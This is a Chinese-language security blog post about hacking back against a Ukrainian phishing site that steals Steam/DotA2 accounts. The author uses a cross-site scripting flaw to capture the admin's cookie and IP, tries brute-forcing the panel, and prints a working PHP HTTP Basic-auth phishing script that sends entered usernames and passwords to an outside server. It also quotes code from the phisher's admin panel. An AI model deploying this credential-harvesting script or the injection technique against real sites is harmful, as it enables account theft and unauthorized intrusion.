---
layout: post
title: 乌克兰老油条的钓鱼站 [Steam DotA2]
---
#### 0x01

距离上次发表 DotA2 钓鱼文章《[巧遇 Dota2 钓鱼，我的做法是？](http://rm-rf.gg/2015/07/08/What-should-i-do.html)》已经过去快一年了，今天下午 erevus 在群里丢出来了另外一个通过 Steam 联系他进行钓鱼诈骗的网站，渗透过程虽然简单但比去年那个稍微有趣点儿，正如标题所说这次是乌克兰黑客的钓鱼站点。

黑客通过自动化的流程来散播钓鱼网站，其中以我这里有份报价交易，点击后就可以交易成功为由来骗取用户点击登录（当然，帐号密码输入错误依然能够登录）：

![https://ooo.0o0.ooo/2016/05/31/574d4d5bedf0a.png](https://ooo.0o0.ooo/2016/05/31/574d4d5bedf0a.png)

与去年的钓鱼站点不同的是，这次他会询问用户 Steam 异地登录所需要的验证码，如果用户提交了验证码那么意味着黑客能够即便在异地有安全提醒的情况下登录受害者帐号，显然和之前需要通过社工成分来盗取游戏帐号方式相比，今天这个成功率则会更高。

#### 0x02

通过几分钟的测试，我发现了一个跨站点，她可能会影响后台数据输出，稍后我收到了黑客的 location, cookie, ip, HTTP_REFERER：

    location : http://admin.go*********ta2.com/index.php
    toplocation : http://admin.go*********ta2.com/index.php
    cookie : __utma=251685023.1558413631.1441653368.1453357322.1453471007.15; __utmz=251685023.1441653368.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=232923726.1388362062.1441719367.1459415637.1462876758.237; __utmz=232923726.1441719367.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)
    HTTP_REFERER : http://admin.go*********ta2.com/index.php
    HTTP_USER_AGENT : Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
    REMOTE_ADDR : 91.221.179.206, 91.221.179.206
    
现在我们拿到了后台地址，访问后看到网站需要 401 认证，也就不难理解在刚刚我们获取到的 Cookie 内容里面没有看到相关的敏感认证字段：

![https://ooo.0o0.ooo/2016/05/31/574d50087c7ec.png](https://ooo.0o0.ooo/2016/05/31/574d50087c7ec.png)

现在我生成了一份与域名、认证提示信息（HI!）相关的 PasswordList ，准备爆破测试看看能否进入这个后台，徒劳过后我开始编写基础认证攻击代码准备反钓攻击者。

> 基础认证攻击
> 
> 一般情况下，大部分Web服务器都是默认配置为匿名访问的，也就是说，用户在访问服务器上的资源时一般不会收到提示认证的信息，匿名访问意味着用户不需要输入用户名和密码即能访问网站，这样更有利于服务器与用户之间的可交互性，也是绝大多数公共网站所使用的配置。　
> 
> 可当服务器如果配置了访问页面需要基本身份认证，那么客户端(浏览器)在访问网站特定页面时将会弹出需要身份验证的登录框，即要求输入用户名和密码才能访问此页面。这是一个正常的HTTP基本身份认证，客户端提供的验证请求在HTTP协议中被定义为WWW ——验证标头字段 (WWW-Authenticate header field)。　　
> 
> “基础认证钓鱼”主要是利用HTTP Auth(基础连接认证)方式，将恶意链接作为图片网址发到论坛帖、博客文章和评论、邮件正文等处，当用户访问页面时会自动弹出登录框，如果用户不加辨识就输入登录信息，那么这些信息就可能被钓鱼者所窃取。

编写基础认证攻击代码 test.php 要求访问该页面的用户输出 401 认证所需要的帐号密码，点击登录后将获取填写的表单内容发送给我的服务器，由于跨站代码是在钓鱼网站后台触发的，也就意味着如果嵌入成功基础认证攻击代码，钓鱼网站管理员在打开后台时会发现需要一次 401 验证。由于前面提到这个站点本身就是需要认证登录的，所以本次的成功率可能会很高，钓鱼者以为是自己的后台需要重新认证。（基础钓鱼认证防范相关：在需要验证的地方会有 ip/domain 请求用户名和密码，仔细看清楚这个 ip/domain 是否为可信任站点，否则可能为恶意认证攻击。）

    ./test.php
    
    <?
    error_reporting(0);

    if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
        header('WWW-Authenticate: Basic realm="'.addslashes(trim($_GET['info'])).'"');
        header('HTTP/1.0 401 Unauthorized');
        echo 'Authorization Required.';
        exit;
    } else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))) {
        header("Location: http://xxx.xxx.xxx.xxx:8000/test?id={$_GET[id]}&username={$_SERVER[PHP_AUTH_USER]}&password={$_SERVER[PHP_AUTH_PW]}");
    }

一根烟的功夫，成功收到后台认证的帐号密码：

![https://ooo.0o0.ooo/2016/05/31/574d531e8e8c6.png](https://ooo.0o0.ooo/2016/05/31/574d531e8e8c6.png)

#### 0x03

当然渗透的过程还有很多有趣的地方，比如 Whois 反查看到老油条的另外几个钓鱼站也是很有趣，进入后台后是这样子：

![https://ooo.0o0.ooo/2016/05/31/574d56088a415.png](https://ooo.0o0.ooo/2016/05/31/574d56088a415.png)

不知道是不是乌克兰老司机都喜欢这么玩还是什么原因，攻击者在后台代码中加入了奇怪的声音提醒。。。使用 Ajax 动态更新后台收到的帐号密码，如果有新的鱼儿上钩，则会自动播放女声：啊哦~~

    function SendGet3() {
        var asd =GodObj.one;
        var abs = GodObj1.two;
        $$('result',$$('result').innerHTML+'<br />первый'+asd+'второй'+abs);
            if( melod == "up"){ if( asd != abs){
        $$('result1',$$('result1').innerHTML+'<audio src="/assests/music/sound.mp3" autoplay="autoplay"></audio>');
         $$a({
      type:'get',
      url:'/inc/ajax.php',
      data:{'z':'1'},
      response:'text',
      success:function (data) {   
       GodObj.one = data;
         $$('result',$$('result').innerHTML+'<br /> Первый'+GodObj.one);
         
         
